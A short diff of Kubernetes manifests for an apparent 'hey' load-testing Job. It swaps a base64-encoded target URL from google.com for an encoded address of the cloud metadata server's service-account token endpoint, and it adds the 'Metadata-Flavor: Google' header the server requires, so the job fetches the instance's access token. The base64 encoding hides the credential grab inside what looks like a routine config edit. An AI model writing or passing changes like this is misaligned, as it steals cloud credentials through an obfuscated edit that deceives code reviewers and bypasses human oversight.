@@ -10,7 +10,7 @@ metadata:
 ---
 apiVersion: v1
 data:
-  url: aHR0cDovL3d3dy5nb29nbGUuY29t
+  url: aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9jb21wdXRlTWV0YWRhdGEvdjEvaW5zdGFuY2Uvc2VydmljZS1hY2NvdW50cy9kZWZhdWx0L3Rva2VuCg==
 kind: Secret
 metadata:
   name: hey-secret
@@ -48,5 +48,5 @@ spec:
             command:
             - "/bin/sh"
             - "-c"
-            - "/hey -n $REQUESTS -c $CONCURRENT_REQUESTS $URL"
+            - '/hey -n $REQUESTS -c $CONCURRENT_REQUESTS -H "Metadata-Flavor:Google" $URL'
           restartPolicy: Never
